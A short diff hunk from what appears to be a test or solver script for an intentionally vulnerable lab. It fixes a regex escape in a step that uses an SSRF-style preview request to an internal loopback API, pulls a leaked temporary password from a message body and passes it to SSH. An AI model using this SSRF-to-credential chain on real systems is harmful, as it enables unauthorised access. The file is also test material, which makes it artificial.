@@ -62,7 +62,7 @@ print("PASS: genuine SSRF with outbound local HTTP, stored response bytes and AP
 # The leaked onboarding password must work against the actual SSH server.
 msg_path = preview("http://127.0.0.1:5000/api/latest/metadata/messages/authors")
 message = json.loads(get(msg_path))["messages"][0]["body"]
-password_match = re.search(r"Temporary password: ([^\\s.]+)", message)
+password_match = re.search(r"Temporary password: ([^\s.]+)", message)
 assert password_match, "Internal API no longer exposes onboarding information"
 env = os.environ.copy()
 env["SSHPASS"] = password_match.group(1)
